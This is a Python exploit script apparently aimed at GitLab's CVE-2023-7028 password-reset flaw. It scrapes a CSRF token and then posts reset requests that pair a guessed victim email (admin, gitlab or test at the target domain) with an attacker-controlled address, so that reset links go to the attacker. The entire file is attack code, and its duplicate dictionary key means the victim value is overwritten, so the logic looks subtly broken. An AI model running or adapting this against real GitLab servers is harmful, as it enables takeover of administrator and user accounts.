import re
import socket
import tldextract
from urllib.parse import urljoin
import requests
import urllib3
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_domain(url):
    try:
        socket.inet_aton(url)
        return "testgitlab.com"
    except socket.error:
        ext = tldextract.extract(url)
        domain = ext.registered_domain
        if domain:
            return domain
        else:
            return "testgitlab.com"
def grab_token(url,session):
    target = urljoin(url,"/users/password/new")
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Referer": "" + url + "/users/sign_in", "Connection": "close", "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br"
}
    response = session.get(target, headers=headers, verify=False)
    pattern = r'<meta name="csrf-token" content="(.+?)" />'
    match = re.findall(pattern, response.text)
    if match:
        token = match[0]
        return token
    else:
        return False

def reset_password(url, session,token, victim, attacker):
    paramsPost = {
        "user%5Bemail%5D": victim,
        "user%5Bemail%5D": attacker,
        "authenticity_token": token
    }
    headers = {
        "Origin": "" + url + "",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Referer": "" + url + "/users/password/new", "Connection": "close",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    target = urljoin(url, "/users/password")
    response = session.post(target, data=paramsPost, headers=headers, verify=False)
    if "If your email address exists " in response.text:
        return True
    else:
        return False

def get_user_email(url,arg_domain):
    if arg_domain:
        return arg_domain
    else:
        domain = get_domain(url)
        domains=[]
        victimlists=["admin","gitlab","test"]
        for i in victimlists:
            domains.append(i+"@"+domain)
        return domains

def check(url,attacker,arg_domain):
    session = requests.Session()
    if attacker:
        attacker = attacker
    else:
        attacker = "attcker@attcker.com"
    token = grab_token(url, session)
    victims = get_user_email(url,arg_domain)
    for victim in victims:
        if reset_password(url,session,token,victim,attacker):
            print("Disfound:{}Password_Reset_CVE_2023_7028".format(url))
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=False, default="http://gitlab.lan",
                        help="URL of host to check will need http or https")
    parser.add_argument("-v", "--victim", default="", required=False, help="victim email address")
    parser.add_argument("-a", "--attacker", default="", required=False, help="attacker email address")
    args = parser.parse_args()

    url = args.url
    victim = args.victim
    attacker = args.attacker
    if url:
        check(url, attacker, victim)